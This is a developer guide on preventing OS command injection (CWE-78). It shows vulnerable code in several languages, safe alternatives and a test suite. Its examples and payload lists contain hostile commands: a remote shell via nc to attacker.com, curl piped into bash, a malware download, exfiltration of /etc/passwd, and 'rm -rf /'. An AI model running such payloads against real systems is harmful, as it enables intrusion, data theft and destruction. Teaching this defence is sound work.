# OS Command Injection Prevention

**CWE-78: Improper Neutralization of Special Elements used in an OS Command**

## The Problem

OS Command Injection occurs when an application executes operating system commands constructed from user-supplied input without proper sanitization, allowing attackers to execute arbitrary system commands.

**Attack Scenario:**

```bash
# Application: PDF conversion service
POST /api/convert
{ "filename": "document.txt" }

# Vulnerable code
exec(`pdftotext ${filename} output.pdf`)

# Attacker sends:
{ "filename": "document.txt; rm -rf /" }

# Executed command:
pdftotext document.txt; rm -rf / output.pdf
# Result: Deletes entire filesystem
```

## Why Critical

- **Complete System Compromise**: Attacker gains shell access
- **Data Exfiltration**: Access to all files, databases, environment variables
- **Lateral Movement**: Attack other systems on the network
- **Ransomware**: Encrypt or destroy data
- **Backdoor Installation**: Persistent access

**CVSS Score**: 9.8 (CRITICAL)

---

## Attack Vectors

### 1. File Operations

```python
# VULNERABLE
import os
filename = request.GET['file']
os.system(f'cat uploads/{filename}')

# Attacker sends:
?file=../../etc/passwd
?file=file.txt; cat /etc/shadow
?file=`whoami`
```

### 2. Network Utilities

```javascript
// VULNERABLE
const { exec } = require('child_process');
const host = req.query.host;
exec(`ping -c 4 ${host}`, (error, stdout) => {
  res.send(stdout);
});

// Attacker sends:
?host=8.8.8.8; cat /etc/passwd
?host=8.8.8.8 && curl http://attacker.com/shell.sh | bash
?host=8.8.8.8 | nc attacker.com 4444 -e /bin/bash
```

### 3. Archive Operations

```php
// VULNERABLE
$archive = $_POST['archive'];
shell_exec("tar -xzf $archive");

// Attacker sends:
archive=file.tar.gz; wget http://attacker.com/malware.sh
archive=file.tar.gz && chmod +x malware.sh && ./malware.sh
```

### 4. Image Processing

```ruby
# VULNERABLE
image = params[:image]
`convert #{image} -resize 800x600 output.jpg`

# Attacker sends:
image=photo.jpg; curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd | base64)
```

---

## Command Injection Payloads

### Unix/Linux

```bash
; ls -la                    # Command chaining
&& cat /etc/passwd         # AND operator
|| whoami                  # OR operator
| nc attacker.com 4444     # Pipe output
`whoami`                   # Command substitution
$(whoami)                  # Command substitution (modern)
> /var/www/shell.php       # Output redirection
< /etc/passwd              # Input redirection
```

### Windows

```cmd
& dir                      # Command chaining
&& type C:\Windows\win.ini # AND operator
|| whoami                  # OR operator
| findstr "password"       # Pipe output
```

### Special Characters

```
; & | ` $ ( ) < > >> \n \r
```

---

## Prevention Strategies (Defense in Depth)

### Strategy 1: NEVER Use Shell Commands (PREFERRED)

**Use language libraries instead of system calls:**

```python
# [REJECTED] VULNERABLE - Shell command
import os
os.system(f'mkdir {dirname}')

# [APPROVED] SAFE - Native library
import os
os.mkdir(dirname)

# [REJECTED] VULNERABLE - Shell command to list files
os.system(f'ls {directory}')

# [APPROVED] SAFE - Native library
import os
files = os.listdir(directory)
```

```javascript
// [REJECTED] VULNERABLE - Shell command
const { exec } = require('child_process');
exec(`cat ${filename}`, callback);

// [APPROVED] SAFE - Native library
const fs = require('fs');
fs.readFile(filename, 'utf8', callback);

// [REJECTED] VULNERABLE - Shell ping
exec(`ping ${host}`, callback);

// [APPROVED] SAFE - Use ping library
const ping = require('ping');
ping.promise.probe(host).then(callback);
```

```php
// [REJECTED] VULNERABLE - Shell command
shell_exec("rm $filename");

// [APPROVED] SAFE - Native function
unlink($filename);

// [REJECTED] VULNERABLE - Shell archive
shell_exec("tar -xzf $archive");

// [APPROVED] SAFE - Use PharData
$phar = new PharData($archive);
$phar->extractTo($destination);
```

---

### Strategy 2: Input Validation (Whitelist)

**If shell commands unavoidable, validate input strictly:**

```python
# [APPROVED] Whitelist validation
import re

def is_safe_filename(filename):
    # Only alphanumeric, dash, underscore, dot
    return bool(re.match(r'^[a-zA-Z0-9._-]+$', filename))

def convert_file(filename):
    if not is_safe_filename(filename):
        raise ValueError('Invalid filename')
    
    # Still use subprocess safely (see Strategy 3)
    subprocess.run(['pdftotext', filename, 'output.pdf'], check=True)
```

```javascript
// [APPROVED] Whitelist validation
const SAFE_FILENAME_REGEX = /^[a-zA-Z0-9._-]+$/;

function isSafeFilename(filename) {
  return SAFE_FILENAME_REGEX.test(filename);
}

app.get('/api/file', (req, res) => {
  const filename = req.query.file;
  
  if (!isSafeFilename(filename)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  // Use safe method (see Strategy 1)
  fs.readFile(`uploads/${filename}`, 'utf8', (err, data) => {
    res.send(data);
  });
});
```

---

### Strategy 3: Use Parameterized Commands

**Pass arguments as array, not concatenated string:**

```python
# [REJECTED] VULNERABLE - String concatenation
import subprocess
subprocess.call(f'ping -c 4 {host}', shell=True)  # shell=True is DANGEROUS

# [APPROVED] SAFE - Array parameterization
import subprocess
subprocess.run(['ping', '-c', '4', host], shell=False, check=True)
# shell=False prevents command injection
```

```javascript
// [REJECTED] VULNERABLE - String concatenation
const { exec } = require('child_process');
exec(`convert ${input} -resize 800x600 ${output}`);

// [APPROVED] SAFE - Use execFile with array
const { execFile } = require('child_process');
execFile('convert', [input, '-resize', '800x600', output], callback);
```

```rust
// [APPROVED] SAFE - Rust Command API
use std::process::Command;

let output = Command::new("ping")
    .arg("-c")
    .arg("4")
    .arg(&host)  // Passed as argument, not shell interpretation
    .output()?;
```

---

### Strategy 4: Escape Special Characters

**Last resort if shell commands required (NOT RECOMMENDED):**

```python
# [APPROVED] Use shlex for escaping (Python)
import shlex
import subprocess

user_input = request.GET['input']
safe_input = shlex.quote(user_input)  # Escapes special characters

subprocess.run(f'command {safe_input}', shell=True)
```

```javascript
// [APPROVED] Use shell-escape library (Node.js)
const shellescape = require('shell-escape');

const userInput = req.query.input;
const safeInput = shellescape([userInput]);

exec(`command ${safeInput}`, callback);
```

**WARNING**: Escaping is error-prone. Prefer Strategy 1 (native libraries) or Strategy 3 (parameterized commands).

---

###  Strategy 5: Least Privilege Execution

**Run commands with minimal permissions:**

```python
# [APPROVED] Run as unprivileged user
import subprocess
import pwd

# Get unprivileged user UID
nobody_uid = pwd.getpwnam('nobody').pw_uid

def run_as_nobody():
    os.setuid(nobody_uid)

subprocess.run(
    ['command', 'arg'],
    preexec_fn=run_as_nobody,  # Execute as 'nobody' user
    shell=False
)
```

```dockerfile
# [APPROVED] Docker container with non-root user
FROM node:18-alpine

# Create unprivileged user
RUN addgroup -g 1001 appgroup && \
    adduser -D -u 1001 -G appgroup appuser

# Run as unprivileged user
USER appuser

CMD ["node", "app.js"]
```

---

### Strategy 6: Sandboxing and Isolation

**Isolate command execution:**

```javascript
// [APPROVED] Use isolated container/VM
const Docker = require('dockerode');
const docker = new Docker();

async function runCommandSafely(command, args) {
  const container = await docker.createContainer({
    Image: 'alpine',
    Cmd: [command, ...args],
    HostConfig: {
      NetworkMode: 'none',  // No network access
      ReadonlyRootfs: true,  // Read-only filesystem
      Memory: 100 * 1024 * 1024,  // 100MB RAM limit
    }
  });
  
  await container.start();
  const output = await container.wait();
  await container.remove();
  
  return output;
}
```

---

## Dangerous Functions to Avoid

### Python

```python
# NEVER USE THESE
os.system()       # Invokes shell
os.popen()        # Invokes shell
subprocess.call(..., shell=True)  # shell=True is dangerous
subprocess.Popen(..., shell=True)
eval()            # Executes arbitrary code
exec()            # Executes arbitrary code
```

### JavaScript/Node.js

```javascript
// NEVER USE THESE
exec()            // Invokes shell
execSync()        // Invokes shell
spawn(..., {shell: true})  // shell: true is dangerous
eval()            // Executes arbitrary code
```

### PHP

```php
// NEVER USE THESE
system()
shell_exec()
exec()
passthru()
popen()
proc_open()
backticks ``      // Equivalent to shell_exec()
eval()            // Executes arbitrary code
```

### Ruby

```ruby
# NEVER USE THESE
system()
exec()
`backticks`       # Shell command execution
%x{}              // Shell command execution
eval()            # Executes arbitrary code
```

---

## Safe Alternatives by Use Case

### File Operations

```python
# [REJECTED] Shell command
os.system(f'cat {file}')

# [APPROVED] Native library
with open(file, 'r') as f:
    content = f.read()
```

### Network Diagnostics

```python
# [REJECTED] Shell ping
os.system(f'ping -c 4 {host}')

# [APPROVED] Python library
import subprocess
result = subprocess.run(['ping', '-c', '4', host], capture_output=True, shell=False)
```

### Archive Operations

```python
# [REJECTED] Shell tar
os.system(f'tar -xzf {archive}')

# [APPROVED] Python tarfile
import tarfile
with tarfile.open(archive, 'r:gz') as tar:
    tar.extractall(path=destination)
```

### Image Processing

```python
# [REJECTED] Shell ImageMagick
os.system(f'convert {input} -resize 800x600 {output}')

# [APPROVED] Pillow library
from PIL import Image
img = Image.open(input)
img.thumbnail((800, 600))
img.save(output)
```

---

## Testing for Command Injection

**Security test payloads:**

```javascript
const COMMAND_INJECTION_PAYLOADS = [
  '; ls -la',
  '&& whoami',
  '|| pwd',
  '| cat /etc/passwd',
  '`whoami`',
  '$(whoami)',
  '; curl http://attacker.com',
  '& ping -n 10 127.0.0.1 &',
  '\n whoami',
  '| nc attacker.com 4444'
];

describe('Command Injection Protection', () => {
  COMMAND_INJECTION_PAYLOADS.forEach(payload => {
    it(`should reject payload: ${payload}`, async () => {
      const response = await request(app)
        .get('/api/file')
        .query({ filename: `document.txt${payload}` });
      
      expect(response.status).toBe(400);
      expect(response.body.error).toMatch(/invalid/i);
    });
  });
});
```

---

## Verification Checklist

- [ ] NO shell command execution (use native libraries instead)
- [ ] If shell commands unavoidable, use parameterized execution (shell=False)
- [ ] Input validation whitelist (alphanumeric only where possible)
- [ ] NO string concatenation for command arguments
- [ ] Commands run with least privilege (unprivileged user)
- [ ] Sandboxing/containerization for risky operations
- [ ] Dangerous functions banned (`eval`, `exec`, `system`, etc.)
- [ ] Automated tests with command injection payloads
- [ ] Code review checks for exec/system calls
- [ ] Security scanning tools enabled (e.g., Bandit, ESLint security plugin)

---

## Real-World Examples

**Shellshock (2014)**: Bash vulnerability (CVE-2014-6271) allowed command injection via environment variables, affecting millions of systems.

**ImageTragick (2016)**: ImageMagick command injection via crafted image files (CVE-2016-3714).

---

## References

- CWE-78: Improper Neutralization of Special Elements used in an OS Command
- OWASP Top 10 2021: A03 Injection
- NIST SP 800-53: SI-10 (Information Input Validation)
- OWASP Command Injection Cheat Sheet
